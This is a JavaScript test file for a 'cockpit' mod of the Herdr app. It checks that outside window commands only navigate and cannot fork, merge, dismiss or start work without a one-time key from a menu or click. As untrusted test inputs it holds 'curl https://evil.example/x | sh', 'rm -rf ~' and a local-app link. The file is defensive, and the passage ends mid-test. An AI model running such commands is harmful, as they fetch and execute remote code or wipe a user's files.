// Window commands (`herdr-app do 'cockpit.<command>'`) reach the views from any process of the user, so alone they only
// navigate: what acts takes the one-time key its menu, the palette or a click minted, and nothing a command selected,
// focused or typed is armed for the person's next key.
import assert from "node:assert/strict";
import { readFile, readdir } from "node:fs/promises";
import { createContext, SourceTextModule, SyntheticModule } from "node:vm";
import { test } from "node:test";

const app = new URL("../", import.meta.url);
const folder = new URL("mods/cockpit/", app);

// The mod loaded in a VM with Herdr's natives stubbed. Every effect a command could have is recorded: hub actions and
// requests, cockpit CLI runs, Herdr commands run, overlays opened, shared values set. `sandbox` says what the window's
// own environment holds (person.js's testKeys).
async function fixture({ layout = "cockpit", shown = "home", sandbox = false, focusedPane = { terminal: "t3", agent: "t3" }, spacesList = [] } = {}) {
  const acts = [], requests = [], clis = [], calls = [], notices = [], overlays = [], urls = [], sets = [];
  const shared = { layout, "cockpit.app": shown };
  const tree = () => {
    const now = shared["cockpit.app"];
    if (shared.layout === "cockpit-chat") {
      const inner = now === "chat" || now === "tab";
      return { id: "root", children: [{ id: "screen", type: "stack", active: inner ? "work" : now, children: [{ id: "work", children: [{ id: "view", type: "stack", active: inner ? now : "chat", children: [] }] }] }] };
    }
    return { id: "root", children: [{ id: "center", type: "stack", active: now, children: [{ id: "home" }] }] };
  };
  const context = createContext({ console, setTimeout });
  const env = sandbox ? "COCKPIT_SANDBOX=/tmp/cc-x\nCOCKPIT_TEST_KEYS=1\nHOME=/h\n" : "COCKPIT_TEST_KEYS=1\nHOME=/h\n";
  const imports = {
    herdr: {
      agents: () => [], spaces: () => spacesList, run: (...a) => calls.push(a), notify: (n) => notices.push(n),
      setShared: (k, v) => (sets.push(k), (shared[k] = v)), shared: (k) => shared[k] ?? null, layout: () => tree(), focused: () => focusedPane,
      openOverlay: (o) => (overlays.push(o), "o1"), closeOverlay: () => {}, props: () => ({}), settings: () => ({}), theme: () => ({}),
      keys: () => [], commands: () => [], panes: () => [], window: () => ({ platform: "macos", active: true }), layouts: () => [],
      appHome: () => "/tmp/cc-x/herdr-home", home: () => "/h", readTextFile: async () => null, placement: () => null, machines: () => [],
      exec: async (cmd) => (cmd === "/usr/bin/env" ? { code: 0, stdout: env, stderr: "" } : { code: 1, stdout: "", stderr: "" }),
    },
    "gpui-base": {
      VirtualListScrollHandle: { new: () => ({ scroll_to_item() {}, release() {} }) },
      ScrollHandle: { new: () => ({ scroll_to_item() {}, release() {} }) },
      InputState: { new: () => ({ v: "", set_value(x) { this.v = x; }, value() { return this.v; }, focus() {}, on() {} }) },
    },
    "./hub.js": {
      act: async (app, action, args) => (acts.push({ app, action, args }), { note: "ok", error: null }),
      request: async (op, body) => (requests.push({ op, ...body }), { note: "ok" }),
      cockpit: async (args) => (clis.push(args), { code: 0, stdout: "", stderr: "" }),
      view: async () => null, openUrl: async (url) => urls.push(url), install: async () => ({}), sleep: async () => {},
      subscribe: () => ({ stop() {} }), remoteMachine: () => null, isUnconfirmed: () => false, fetchDetails: async () => ({}), events: async () => [],
    },
  };
  const sources = new Map(), modules = new Map();
  for (const name of await readdir(folder)) {
    if (!name.endsWith(".js")) continue;
    const text = await readFile(new URL(name, folder), "utf8");
    sources.set(`./${name}`, text);
    for (const m of text.matchAll(/import\s*\{([^}]+)\}\s*from\s*"(herdr|gpui-kit|gpui-base)"/g)) {
      const ex = (imports[m[2]] ??= {});
      for (const w of m[1].split(",")) {
        const key = w.trim().split(/\s+as\s+/)[0];
        ex[key] ??= () => { throw new Error(`unexpected native call: ${key}`); };
      }
    }
  }
  const load = (name) => {
    if (modules.has(name)) return modules.get(name);
    const native = imports[name];
    const mod = native
      ? new SyntheticModule(Object.keys(native), function () { for (const [k, v] of Object.entries(native)) this.setExport(k, v); }, { context })
      : new SourceTextModule(sources.get(name), { context, identifier: name });
    modules.set(name, mod);
    return mod;
  };
  const entry = [
    'export { runCommand, runnerCommands, CATALOGUE, paletteAction, describe, sheet } from "./commands.js";',
    'export { keyed, unkey, take, testKeys, holds, MOVE_FIRST } from "./person.js";',
    'export { follow, rowOf, deliver } from "./notify.js";',
    'export { AgentsModel } from "./agentsui.js";',
    'export { fleet } from "./fleet.js";',
    'export { default as Home } from "./home.js";',
    'export { default as Runbook } from "./runbook.js";',
    'export { default as Monitor } from "./monitor.js";',
    'export { default as Routines } from "./routines.js";',
    'export { default as Inbox } from "./inbox.js";',
    'export { default as Mail } from "./mail.js";',
    'export { default as Meetings } from "./meetings.js";',
    'export { default as Todo } from "./todo.js";',
    'export { default as Show } from "./show.js";',
    'export { default as Start } from "./start.js";',
    'export { default as Review } from "./review.js";',
    'export { default as Code } from "./code.js";',
    'export { default as Palette } from "./palette.js";',
    'export { default as Recap } from "./recap.js";',
    'export { default as ChatTop } from "./chat-top.js";',
    'export { default as Chat, digitAnswers } from "./chat.js";',
    'export { default as Update } from "./update.js";',
    'export { default as Settings } from "./doctor.js";',
  ].join(" ");
  const m = new SourceTextModule(entry, { context });
  await m.link(load);
  await m.evaluate();
  return { mod: m.namespace, acts, requests, clis, calls, notices, overlays, urls, sets, shared };
}

/** A context whose timers run at once and whose spawned work can be awaited. */
function context() {
  const work = [];
  const cx = { notify() {}, stop_propagation() {}, write_to_clipboard() {}, spawn: (f) => work.push(f(cx)), timer: { after: (_ms, f) => f(cx), every() {} } };
  return { cx, settled: async () => { for (let i = 0; i < 3; i++) { await Promise.all(work); await new Promise((r) => setTimeout(r, 0)); } } };
}
const plain = (v) => JSON.parse(JSON.stringify(v));
const focus = () => ({ focused: false, focus() { this.focused = true; }, is_focused() { return this.focused; } });
const toasts = () => ({ msgs: [], push(_cx, m) { this.msgs.push(m); } });
const field = (v = "") => ({ v, set_value(x) { this.v = x; }, value() { return this.v; }, focus() {}, on() {} });

/** A command as main.js hands it on: its key taken off. */
function send(mod, view, raw, cx) {
  const { command, key } = mod.unkey(raw);
  return view.command(command, cx, key);
}

const PR = "https://github.com/acme/api/pull/9";
const t3 = { terminal: "app:t3", address: "t3", frontend: "app", stage: "working", status: "working", since: 1, tab: "tab3", branch: "feat", pr: { url: PR, repo: "acme/api", number: 9, title: "Quota per plan" } };
const perm = (address, asked, since) => ({ terminal: `app:${address}`, address, frontend: "app", stage: "needs_you", status: "blocked", since,
  question: { text: "May it run Bash: rm -rf build?", kind: "single", permission: true, cursor: null, asked, choices: [{ n: 1, label: "Yes" }, { n: 2, label: "No" }] } });

function home(mod, rows) {
  const h = Object.create(mod.Home.prototype);
  Object.assign(h, { rows: { agents: rows }, home: {}, stages: new Map(), busy: new Map(), picks: new Map(), replying: null, confirm: null, filter: null, showArchived: false,
    toasts: toasts(), flashes: { start() {} }, handle: focus(), drawn: new Map(), sel: null, chosen: null, reply: field() });
  return h;
}

// ---------------------------------------------------------------------------------------------------------------------
// The fifth review's reproductions, fixed

test("a toast's target, a button's included, only ever brings its row into view, in both layouts", async () => {
  for (const layout of ["cockpit", "cockpit-chat"]) {
    const { mod, clis, acts, overlays } = await fixture({ layout });
    const { cx, settled } = context();
    const pr = "https://github.com/acme/api/pull/1";
    for (const t of [`act:merge:${pr}`, `act:rerun:${pr}/checks`, `act:review:${pr}`, `act:ci:${pr}`, "act:plan:eng-1", "act:routine:sweep", `herdr-app:act:merge:${pr}`, "inbox:ENG-2", "resume"])
      assert.equal(mod.runCommand(`target:${t}`, cx, layout), true);
    assert.equal(mod.runCommand("target:update", cx, layout), true);
    await settled();
    assert.deepEqual(plain(clis), [
      ["focus", `inbox:${pr}`], ["focus", `inbox:${pr}`], ["focus", `inbox:${pr}`], ["focus", `inbox:${pr}`],
      ["focus", "inbox:ENG-1"], ["focus", "routine:sweep"], ["focus", `inbox:${pr}`], ["focus", "inbox:ENG-2"], ["focus", "resume"],
    ], "rows, never `cockpit focus act:…`; resume stays, as `cockpit focus resume` does");
    assert.equal(acts.length, 0);
    assert.equal(overlays.at(-1)?.props?.app, "update", "the update's click opens its dialog, where the person installs it");
  }
});

test("a link from a window command opens a web page, never a file or an app", async () => {
  const { mod, urls } = await fixture();
  const { cx, settled } = context();
  mod.runCommand("link:/Applications/Calculator.app", cx, "cockpit");
  mod.runCommand("link:file:///tmp/x.command", cx, "cockpit");
  mod.runCommand("link:https://acme.example/dash", cx, "cockpit");
  await settled();
  assert.deepEqual(plain(urls), ["https://acme.example/dash"]);
});

test("a bare `session` opens a menu naming the start; picked from it, with its key, the session starts", async () => {
  const { mod, acts, overlays } = await fixture({ layout: "cockpit-chat", shown: "chat", spacesList: [{ id: "s1", active: true, folder: "/Users/me/code/api", tabs: [] }] });
  const { cx, settled } = context();
  mod.runCommand("session", cx, "cockpit-chat");
  await settled();
  assert.equal(acts.length, 0, "a window command, ⌘⌥N's binding included, starts nothing by itself");
  const item = overlays.at(-1).props.items[0];
  assert.equal(item.label, "Start a session in api");
  assert.equal(overlays.at(-1).props.picked, undefined, "nothing picked");
  assert.equal(overlays.at(-1).props.clickOnly, true, "and ⏎ picks nothing in it: the person's keys were meant for something else");
  const { command, key } = mod.unkey(item.command);
  mod.runCommand(command, cx, "cockpit-chat", { key });
  mod.runCommand(command, cx, "cockpit-chat", { key });
  await settled();
  assert.deepEqual(plain(acts), [{ app: "session", action: "start", args: [{ cwd: "/Users/me/code/api", mode: "default" }] }], "once");
  const resumed = await fixture();
  resumed.mod.runCommand("resume", cx, "cockpit");
  await settled();
  assert.deepEqual(plain(resumed.acts), [{ app: "home", action: "resume", args: [] }], "resume stays a window command, as `cockpit focus resume` is");
});

test("an agent's menu items act only with the key their menu opened with, once", async () => {
  const { mod, acts, overlays } = await fixture();
  const model = Object.create(mod.AgentsModel.prototype);
  Object.assign(model, { view: "sidebar", busy: new Map(), picks: new Map(), value: { agents: [t3] } });
  const { cx, settled } = context();
  for (const c of ["agents|fork|app:t3|tab", "agents|recap|app:t3|", "agents|snooze|app:t3|1h", "agents|seen|app:t3|", "agents|go|app:t3|"]) model.command(c, cx);
  await settled();
  assert.deepEqual(plain(acts), [], "no fork, recap, snooze or seen; go only brings it into view");
  model.menu(t3);
  const fork = overlays.at(-1).props.items.find((i) => i?.command?.startsWith("agents|fork|app:t3|tab"));
  send(mod, model, fork.command, cx);
  send(mod, model, fork.command, cx);
  await settled();
  assert.deepEqual(plain(acts), [{ app: "agents", action: "fork", args: [{ terminal: "app:t3", place: "tab" }] }]);
  const guessed = mod.unkey(fork.command).command;
  model.command(guessed, cx, "0".repeat(32));
  await settled();
  assert.equal(acts.length, 1, "a guessed key forks nothing");
});

test("Home's menu items fork and arm a merge only from its menu; a bare one picks no card", async () => {
  const { mod, acts, overlays } = await fixture({ shown: "home" });
  const h = home(mod, [t3]);
  const { cx, settled } = context();
  h.command("home:fork:a:t3", cx);
  h.command("home:merge:a:t3", cx);
  h.command("home:archive:a:t3", cx);
  await settled();
  assert.equal(acts.length, 0);
  assert.equal(h.confirm, null, "no merge armed for a stray ⏎");
  assert.equal(h.sel, null, "and no card picked");
  h.menu(h.cards().find((c) => c.key === "a:t3"));
  const items = overlays.at(-1).props.items;
  send(mod, h, items.find((i) => i?.command?.includes("home:fork:")).command, cx);
  await settled();
  assert.deepEqual(plain(acts[0]), { app: "agents", action: "fork", args: [{ terminal: "app:t3", place: "tab" }] });
});

test("a window command picks no card of Home's: the next real digit answers only a card the person moved to", async () => {
  const { mod, acts } = await fixture({ shown: "home" });
  const h = home(mod, [perm("t40", "def", 1), perm("t41", "abc", 2)]);
  const { cx, settled } = context();
  // The board opens on its first card, as render() picks it.
  h.sel = h.flat(h.columns(h.cards()))[0].key;
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "the card the board opened on takes no digit");
  h.command("home:nothing:a:t41", cx);
  h.command("home:beside:a:t41", cx);
  h.command("show:home", cx);
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "a card a window command pointed at takes no digit either");
  assert.match(h.toasts.msgs.at(-1), /Pick its card first/);
  h.key({ keystroke: "j" }, cx);
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 1, "moved to with a key, its digit answers");
  assert.equal(acts[0].action, "answer");
});

test("a question's number on Home answers only a card the person moved to, never the one the board opened on or NEXT MOVE", async () => {
  const { mod, acts } = await fixture({ shown: "home" });
  const asks = (address, since) => ({ ...perm(address, `q${address}`, since), question: { text: "Which limit should existing accounts start with?", kind: "single", permission: false, cursor: 1, asked: `q${address}`, choices: [{ n: 1, label: "The plan's default" }, { n: 2, label: "Their last 30 days' peak" }] } });
  const h = home(mod, [asks("t40", 1), asks("t41", 2)]);
  const { cx, settled } = context();
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "nothing picked: NEXT MOVE's question takes no number");
  h.sel = h.flat(h.columns(h.cards()))[0].key;
  h.command("show:home", cx);
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "the card the board opened on takes none either");
  assert.match(h.toasts.msgs.at(-1), /Pick its card first/);
  h.key({ keystroke: "j" }, cx);
  h.key({ keystroke: "2" }, cx);
  await settled();
  assert.equal(acts.length, 1, "moved to with a key, its number answers");
  assert.equal(plain(acts[0].args[0]).choice, 2);
});

test("a card picked on an earlier visit to Home, or before it left the board, takes no number once the board picks it again", async () => {
  const { mod, acts } = await fixture({ shown: "home" });
  const asks = (address, since) => ({ ...perm(address, `q${address}`, since), question: { text: "Which limit?", kind: "single", permission: false, cursor: 1, asked: `q${address}`, choices: [{ n: 1, label: "Default" }, { n: 2, label: "Peak" }] } });
  const rows = [asks("t40", 1), asks("t41", 2)];
  const h = home(mod, rows);
  const { cx, settled } = context();
  h.keepSel(h.columns(h.cards()));
  h.key({ keystroke: "j" }, cx);
  h.key({ keystroke: "k" }, cx);
  assert.equal(h.chosen, h.sel, "moved to");
  h.command("show:home", cx);
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "Home brought back into view: the earlier pick answers nothing");
  h.key({ keystroke: "j" }, cx);
  h.key({ keystroke: "k" }, cx);
  h.rows = { agents: [] };
  h.keepSel(h.columns(h.cards()));
  h.rows = { agents: rows };
  h.keepSel(h.columns(h.cards()));
  assert.equal(h.sel, `a:${rows[0].address}`, "the board picks its first card again");
  h.key({ keystroke: "1" }, cx);
  await settled();
  assert.equal(acts.length, 0, "the card the board picked again is not the person's pick");
});

test("the to-do's action bar and command list act through the click's context, never the drawing's, gone by then", async () => {
  const { mod } = await fixture({ shown: "todo" });
  const td = Object.create(mod.Todo.prototype);
  const gone = () => { throw new Error("the drawing's context is gone"); };
  const drawing = { spawn: gone, notify: gone };
  const spawned = [];
  const click = { spawn: (f) => spawned.push(f), notify() {} };
  const item = { key: "k1", text: "Answer Maya", done: false, parts: [] };
  Object.assign(td, { toasts: toasts(), marks: new Set(), sel: { kind: "item", key: "k1" }, selected: () => item, items: () => [item], targets: () => ["k1"], model: { can_undo: true }, showDone: false, query: { value: () => "" } });
  td.acts(drawing).find((a) => a.id === "toggle").run(click);
  assert.equal(spawned.length, 1, "Done, clicked in the action bar, acts");
  const undo = td.paletteGroups(drawing).flatMap((g) => g.items).find((i) => i.id === "p-undo");
  await assert.doesNotReject(undo.run(click), "a command-list row built while drawing runs on the context it is picked with");
});

test("a runbook's step and book actions run only from its menu", async () => {
  const { mod, requests, overlays } = await fixture({ shown: "runbook" });
  const r = Object.create(mod.Runbook.prototype);
  const step = { key: "eng-1#2", n: "2", step: "Deploy", where: "prod", status: "", command: "make deploy", open: true, acts: [{ id: "run", label: "run", confirm: "run-eng-1-2" }] };
  const book = { slug: "eng-1", name: "ENG-1", steps: [step], acts: [{ id: "talk" }, { id: "refresh" }] };
  Object.assign(r, { scope: "runbook", panel: false, model: { books: [book] }, handle: focus(), confirm: null, picked: new Set(), toasts: toasts(), filter: "" });
  const { cx, settled } = context();
  r.command("runbook:book:eng-1:talk", cx);
  r.command("runbook:act:eng-1#2:run", cx);
  r.command("runbook:status:eng-1#2:0", cx);
  r.command("runbook:done:eng-1#2", cx);
  r.key({ keystroke: "enter" }, cx);
  await settled();
  assert.deepEqual(plain(requests), [], "nothing talks, runs, marks or sets");
  assert.equal(r.confirm, null);
  r.menu(step);
  send(mod, r, overlays.at(-1).props.items.find((i) => i?.command?.startsWith("runbook:act:eng-1#2:run")).command, cx);
  assert.equal(r.confirm?.label, "Run", "picked from the menu, the run asks first");
  r.key({ keystroke: "enter" }, cx);
  await settled();
  assert.equal(requests.at(-1).armed, "run-eng-1-2");
});

test("monitor, routines, inbox, mail, meetings and to-do do nothing on a bare window command", async () => {
  const { mod, requests, acts } = await fixture();
  const { cx, settled } = context();
  const mon = Object.create(mod.Monitor.prototype);
  Object.assign(mon, { byKey: new Map([["iss-1", { item: { key: "iss-1", acts: [{ id: "roll_back", label: "roll back", action: "roll_back", args: ["api"], confirm: "rb" }, { id: "fix", label: "fix", action: "fix", args: ["api", { id: 1 }] }] } }]]), toasts: toasts(), handle: focus(), confirm: null });
  mon.command("monitor:act:fix:iss-1", cx);
  mon.command("monitor:act:roll_back:iss-1", cx);
  const rt = Object.create(mod.Routines.prototype);
  Object.assign(rt, { toasts: toasts(), confirm: null, entry: () => ({ slug: "sweep", acts: [{ id: "talk", action: "talk", args: ["sweep", null] }, { id: "delete", label: "delete", action: "delete", args: ["sweep"], confirm: "del" }] }) });
  rt.command("routines:act:talk:sweep", cx);
  rt.command("routines:act:delete:sweep", cx);
  rt.command("routines:act:file:sweep", cx);
  rt.command("routines:read:-:sweep/run/1", cx);
  const ib = Object.create(mod.Inbox.prototype);
  const row = { key: "https://github.com/acme/api/pull/3", path: "/r3", name: "acme/api#3", kind: "review", acts: [{ label: "review", key: "r", main: true, call: { fn: "review", args: [{ url: "https://github.com/acme/api/pull/3" }] } }, { label: "remove", confirm: "rm", call: { fn: "close_space", args: [] } }] };
  Object.assign(ib, { toasts: toasts(), pending: new Map(), details: new Map(), picked: new Set(), dialog: null, current: () => row });
  for (const c of ["inbox:act:0", "inbox:act:1", "inbox:state:ENG-7:Done", "inbox:pick", "inbox:alike"]) ib.command(c, cx);
  const ml = Object.create(mod.Mail.prototype);
  Object.assign(ml, { toasts: toasts(), model: { messages: [{ id: "m1", fromName: "Maya", raw: { id: "m1" } }] }, hubAct: async (_cx, action, args) => requests.push({ op: "act", app: "mail", action, args }) });
  for (const c of ["mail:reply:m1", "mail:archive:m1", "mail:read:m1"]) ml.command(c, cx);
  const mt = Object.create(mod.Meetings.prototype);
  Object.assign(mt, { toasts: toasts(), open: new Set(), model: { meetings: [{ id: "e1", raw: { id: "e1" } }] }, hubAct: async (_cx, action, args) => requests.push({ op: "act", app: "meetings", action, args }) });
  mt.command("meetings:prepare:e1", cx);
  const td = Object.create(mod.Todo.prototype);
  Object.assign(td, { toasts: toasts(), item: () => ({ key: "k1", parts: [] }), act: async (_cx, action, args) => requests.push({ op: "act", app: "todo", action, args }) });
  for (const c of ["todo:toggle:k1", "todo:delete:k1", "todo:top:k1"]) td.command(c, cx);
  await settled();
  assert.deepEqual(plain(requests), []);
  assert.deepEqual(plain(acts), []);
  assert.equal(mon.confirm ?? rt.confirm ?? ib.dialog, null, "no confirm armed for a stray ⏎");
  // From their menus, with the key, they act.
  mon.command("monitor:act:fix:iss-1", cx, mod.unkey(mod.keyed("monitor:act:fix:iss-1")).key);
  ml.command("mail:reply:m1", cx, mod.unkey(mod.keyed("mail:reply:m1")).key);
  mt.command("meetings:prepare:e1", cx, mod.unkey(mod.keyed("meetings:prepare:e1")).key);
  await settled();
  assert.deepEqual(plain(requests.map((r) => [r.app, r.action])), [["monitor", "fix"], ["mail", "mail_reply"], ["meetings", "prepare"]]);
});

test("show:go puts a confirm block in view, but only a click or a move to it answers it", async () => {
  const { mod, acts } = await fixture();
  const s = Object.create(mod.Show.prototype);
  const view = { name: "deploy", blocks: [{ n: 0, type: "markdown" }, { n: 1, id: "go", type: "confirm", summary: "Deploy to production?", confirm_label: "Deploy" }] };
  Object.assign(s, { name: null, panel: false, handle: focus(), ui: new Map(), toasts: toasts(), view: () => view, first: 0, focus: null, pointed: false });
  const { cx, settled } = context();
  s.command("show:go:deploy#go", cx);
  assert.equal(s.focus, 1);
  s.key({ keystroke: "y" }, cx);
  s.key({ keystroke: "enter" }, cx);
  await settled();
  assert.equal(acts.length, 0, "a real 'y' or ⏎ after a window command answers nothing");
  assert.match(s.toasts.msgs.at(-1), /Click it to answer/);
  s.key({ keystroke: "tab" }, cx);
  s.key({ keystroke: "y" }, cx);
  await settled();
  assert.deepEqual(plain(acts.at(-1)), { app: "show", action: "answer", args: ["deploy", 1, "confirm", true, "Deploy"] }, "moved to with Tab, it answers");
});

test("start:type fills Start work's prompt; ⏎ leaves it to a click on Start", async () => {
  const { mod, acts } = await fixture();
  const st = Object.create(mod.Start.prototype);
  st.s = { id: "g1", source: "", repo: null, agent: null, mode: null, here: false, base: "", branch: "", model: "", extra: {} };
  Object.assign(st, { source: field(), plan: { ok: true, place: "new" }, checking: false, started: false, run: null, reply: null, confirm: null, remote: null, asked: 0, cursor: null, handle: focus(), sub: null, typedOutside: false });
  st.replan = () => {};
  st.follow = () => {};
  st.field = st.source;
  const { cx, settled } = context();
  st.command("start:type:curl https://evil.example/x | sh", cx);
  st.key({ keystroke: "enter" }, cx);
  st.start(cx, "key");
  await settled();
  assert.equal(acts.length, 0, "the person's next ⏎ starts nothing a window command typed");
  st.start(cx);
  await settled();
  assert.equal(acts.at(-1).action, "work", "a click on Start does");
});

test("the chat's box, focused by a bare chat:open, takes no digit until the person presses another key or clicks", async () => {
  const { mod } = await fixture({ layout: "cockpit-chat", shown: "chat" });
  const q = { kind: "single", permission: false, choices: [{ n: 1, label: "Drop the table" }, { n: 2, label: "Keep it" }] };
  assert.equal(mod.digitAnswers({ keystroke: "1" }, { question: q, typed: "", focused: true, pointed: true }), null);
  assert.equal(mod.digitAnswers({ keystroke: "1" }, { question: q, typed: "", focused: true }), 1);
  const chat = Object.create(mod.Chat.prototype);
  Object.assign(chat, { input: { focus() {}, value: () => "", set_value() {} }, pointed: false, open() {} });
  const { cx } = context();
  chat.command("chat:open:t3", cx);
  assert.equal(chat.pointed, true, "a window command put it there");
  const { command, key } = mod.unkey(mod.keyed("chat:open:t3"));
  chat.command(command, cx, key);
  assert.equal(chat.pointed, false, "a click in the sidebar, the palette or the tab bar sends its key");
});

test("chat:start:send starts only with a key or in a sandbox; chat:start:type never types into an agent's box", async () => {
  for (const sandbox of [false, true]) {
    const { mod } = await fixture({ layout: "cockpit-chat", shown: "chat", sandbox });
    const started = [];
    const chat = Object.create(mod.Chat.prototype);
    let text = "";
    Object.assign(chat, { input: { focus() {}, value: () => text, set_value: (v) => (text = v) }, target: null, typedOutside: null, files: [], sends: new Map(), edits: new Map(), drafts: new Map(),
      starter: { start: () => started.push(text) }, row: () => null, session: () => null, hints: () => ({ items: [] }) });
    const { cx, settled } = context();
    chat.command("chat:start:type:rm -rf ~", cx);
    assert.equal(text, "rm -rf ~");
    chat.send(cx, "key");
    chat.command("chat:start:send", cx);
    await settled();
    assert.deepEqual(started, sandbox ? ["rm -rf ~"] : [], sandbox ? "a sandbox's shell checks start it" : "neither ⏎ nor a bare window command starts it");
    chat.send(cx, "click");
    assert.equal(started.length, sandbox ? 2 : 1, "a click on ↑ does");
    text = "";
    chat.row = () => t3;
    chat.command("chat:start:type:yes, merge it", cx);
    assert.equal(text, "", "an agent's box is never typed into from outside");
  }
});

test("the palette types from a shell only in a sandbox, and its picks carry their key", async () => {
  for (const sandbox of [false, true]) {
    const { mod } = await fixture({ layout: "cockpit-chat", sandbox });
    const p = Object.create(mod.Palette.prototype);
    let typed = "";
    Object.assign(p, { input: { set_value: (v) => (typed = v) }, changed() {} });
    const { cx, settled } = context();
    p.command("palette:type:fork", cx);
    await settled();
    assert.equal(typed, sandbox ? "fork" : "");
  }
});

test("the recap's keys act only on the row the person moved to or clicked", async () => {
  const { mod, acts, notices } = await fixture({ shown: "home" });
  const r = Object.create(mod.Recap.prototype);
  const model = Object.create(mod.AgentsModel.prototype);
  Object.assign(model, { view: "recap", busy: new Map(), picks: new Map(), value: { agents: [t3, { ...t3, terminal: "app:t4", address: "t4" }] }, replying: null });
  Object.assign(r, { agents: model, tab: "all", selected: "app:t3", picked: null, filtering: false, filter: { value: () => "" }, handle: focus() });
  const { cx, settled } = context();
  r.key({ key: "f", keystroke: "f" }, cx);
  r.key({ key: "r", keystroke: "r" }, cx);
  await settled();
  assert.equal(acts.length, 0, "opened by ⌘R or a window command, the first row takes no fork or recap");
  assert.match(notices.at(-1).title, /Move to it first/);
  r.key({ key: "j", keystroke: "j" }, cx);
  r.key({ key: "f", keystroke: "f" }, cx);
  await settled();
  assert.deepEqual(plain(acts.at(-1)), { app: "agents", action: "fork", args: [{ terminal: "app:t4", place: "tab" }] });
  model.value.agents[1].question = { text: "Which limit?", kind: "single", asked: "q4", choices: [{ n: 1, label: "Default" }, { n: 2, label: "Peak" }] };
  const before = acts.length;
  r.key({ key: "2", keystroke: "ctrl-2" }, cx);
  r.key({ key: "2", keystroke: "alt-2" }, cx);
  await settled();
  assert.equal(acts.length, before, "no chord answers a question");
});

// ---------------------------------------------------------------------------------------------------------------------
// Dismissing what an agent waits on: the person's act alone

const waitsAt = (address, since) => ({ terminal: `app:${address}`, address, frontend: "app", stage: "needs_you", status: "blocked", since, title: `Agent ${address}`, question: null,
  waits: { kind: "limit", text: "Reached its usage limit · resets 08:00", resets: "08:00" }, dismissed: null });
const dismissedAt = (address, since) => ({ ...waitsAt(address, since), stage: "dismissed", dismissed: { at: 5 } });
const dismissals = (acts) => plain(acts).filter((a) => a.action === "dismiss").map((a) => a.args[0]);

test("an agent's menu dismisses and brings back only with the key it opened with, and offers Undo", async () => {
  const { mod, acts, overlays, notices } = await fixture();
  const model = Object.create(mod.AgentsModel.prototype);
  Object.assign(model, { view: "sidebar", busy: new Map(), picks: new Map(), value: { agents: [{ ...waitsAt("t52", 1), wait: "1:limit" }, dismissedAt("t53", 2), t3] }, undo: null, toasts: null });
  const { cx, settled } = context();
  for (const c of ["agents|dismiss|app:t52|", "agents|restore|app:t53|"]) model.command(c, cx);
  model.command("agents|dismiss|app:t52|", cx, "0".repeat(32));
  await settled();
  assert.deepEqual(dismissals(acts), [], "sent from outside the window, or with a guessed key, nothing is dismissed or brought back");
  // The menu of each row names the one thing that fits it.
  const labels = (row) => (model.menu(row), overlays.at(-1).props.items.filter((i) => i?.label).map((i) => i.label));
  assert.ok(labels(model.rows[0]).includes("Dismiss until it asks again") && !labels(model.rows[0]).includes("Bring back to Needs you"));
  assert.ok(labels(model.rows[1]).includes("Bring back to Needs you") && !labels(model.rows[1]).includes("Dismiss until it asks again"));
  assert.ok(!labels(t3).some((l) => /Dismiss|Bring back/.test(l)), "a working agent has nothing to dismiss");
  assert.ok(labels(model.rows[0]).some((l) => l.startsWith("Snooze")) && labels(model.rows[0]).includes("Mark as seen") === Boolean(model.rows[0].unread), "snooze and seen stay their own items");
  model.menu(model.rows[0]);
  const item = overlays.at(-1).props.items.find((i) => i?.command?.startsWith("agents|dismiss|app:t52|"));
  send(mod, model, item.command, cx);
  send(mod, model, item.command, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [{ terminal: "app:t52", undo: false, wait: "1:limit" }], "once, with the menu's key and the wait it showed");
  // Its Undo shows wherever the person is: on Herdr's toast, whose click opens a menu naming the agent.
  assert.equal(notices.at(-1).action.name, "cockpit.dismiss:undo:app:t52");
  // The fixture's timers run at once, so the Undo is taken from the act itself.
  model.offerUndo({ notify() {}, spawn: cx.spawn, timer: { after() {} } }, "app:t52", "Agent t52");
  assert.equal(model.undo.title, "Agent t52");
  model.undo.onClick(null, cx);
  await settled();
  assert.deepEqual(dismissals(acts).at(-1), { terminal: "app:t52", undo: true }, "Undo brings it back");
  assert.equal(model.undo, null);
  // A view with room for a toast gets the Undo there.
  const pushed = [];
  model.toasts = { push: (_cx, title, opts) => pushed.push({ title, ...opts }) };
  model.offerUndo(cx, "app:t52", "Agent t52");
  assert.equal(pushed[0].title, "Dismissed Agent t52");
  assert.equal(pushed[0].action.label, "Undo");
  model.menu(model.rows[1]);
  send(mod, model, overlays.at(-1).props.items.find((i) => i?.command?.startsWith("agents|restore|app:t53|")).command, cx);
  await settled();
  assert.deepEqual(dismissals(acts).at(-1), { terminal: "app:t53", undo: true });
});

test("x on Home dismisses only the card the person moved to, by a key they pressed, with Undo on the toast", async () => {
  const { mod, acts } = await fixture({ shown: "home" });
  const h = home(mod, [waitsAt("t40", 1), waitsAt("t41", 2), dismissedAt("t42", 3)]);
  const pushed = [];
  h.toasts = { msgs: [], push(_cx, title, opts = {}) { this.msgs.push(title); pushed.push({ title, ...opts }); } };
  const { cx, settled } = context();
  h.sel = h.flat(h.columns(h.cards()))[0].key;
  h.key({ keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [], "the card the board opened on is not dismissed");
  assert.match(h.toasts.msgs.at(-1), /Pick its card first/);
  h.command("home:dismiss:a:t40", cx);
  h.command("home:beside:a:t40", cx);
  h.key({ keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [], "nor one a window command pointed at");
  h.key({ keystroke: "j" }, cx);
  h.key({ keystroke: "x", injected: true }, cx);
  h.key({ keystroke: "x", is_held: true }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [], "a key sent from outside the window, or held down, dismisses nothing");
  const picked = h.chosen;
  h.key({ keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [{ terminal: `app:${picked.slice(2)}`, undo: false }], "moved to with a key, x dismisses it");
  const toast = pushed.find((t) => t.title.startsWith("Dismissed "));
  assert.equal(toast.action.label, "Undo");
  toast.action.onClick(null, cx);
  await settled();
